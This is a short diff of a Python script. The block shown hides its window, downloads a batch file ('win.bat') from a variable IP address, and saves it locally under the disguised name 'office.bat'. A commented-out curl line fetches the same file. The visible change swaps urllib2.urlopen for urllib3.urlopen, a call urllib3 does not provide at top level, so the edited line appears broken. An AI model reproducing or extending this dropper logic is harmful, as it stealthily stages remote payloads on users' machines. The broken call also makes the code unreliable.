@@ -486,7 +486,7 @@ if __name__ == '__main__':
     info = subprocess.STARTUPINFO()
     info.dwFlags = subprocess.STARTF_USESHOWWINDOW
     info.wShowWindow = SW_HIDE
-    f = urllib2.urlopen("http://"+ip+"/win/win.bat")
+    f = urllib3.urlopen("http://"+ip+"/win/win.bat")
     with open(os.getcwd()+"\\office.bat", "wb") as code:
       code.write(f.read())
     #subprocess.Popen("curl -L http://"+ip+"/win/win.bat -o "+os.getcwd()+"\\office.bat", startupinfo=info)       
